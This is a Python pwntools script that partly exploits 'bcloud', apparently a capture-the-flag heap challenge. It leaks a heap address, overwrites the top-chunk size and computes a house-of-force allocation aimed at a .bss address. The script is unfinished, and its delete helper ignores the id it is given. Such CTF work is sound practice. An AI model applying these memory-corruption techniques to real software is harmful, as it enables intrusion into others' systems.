from pwn import *

p = process("./bcloud")
elf = ELF("./bcloud")
libc = ELF("./libc.so.6")
context.log_level = 'debug'

def welcome(name, org, host):
    p.recvuntil("name:\n")
    p.send(name)
    chunkfirst = u32(p.recvuntil("! Welcome")[-13:-9])
    log.info("chunkfirst: %s" % hex(chunkfirst))
    p.recvuntil("Org:\n")
    p.send(org)
    p.recvuntil("Host:\n")
    p.sendline(host)
    return chunkfirst

def new(length, content):
    p.recvuntil("--->>")
    p.sendline("1")
    p.recvuntil("Input the length of the note content:\n")
    p.sendline(str(length))
    p.recvuntil("Input the content:\n")
    p.send(content)

def show():
    p.recvuntil("--->>")
    p.sendline("2")

def edit(id, newcontent):
    p.recvuntil("--->>")
    p.sendline("3")
    p.recvuntil("id:\n")
    p.sendline(str(id))
    p.recvuntil("new content:\n")
    p.sendline(newcontent)

def delete(id):
    p.recvuntil("--->>")
    p.sendline("4")
    p.recvuntil("id:\n")
    p.sendline(str(0))

#part one
gdb.attach(p)
name = "Bill"*0x10
org = "A" * 0x40
host = p32(0xffffffff)
leak = welcome(name, org, host)

#part two
bss = 0x804b0a0
topchunk = leak + 0x48 * 3 - 8
length = bss - 8 - topchunk - 12
log.info("length: %s" % hex(length))
newcontent= ''
new(length, newcontent)
#edit(0, "B"*20)
#delete(0)
p.interactive()
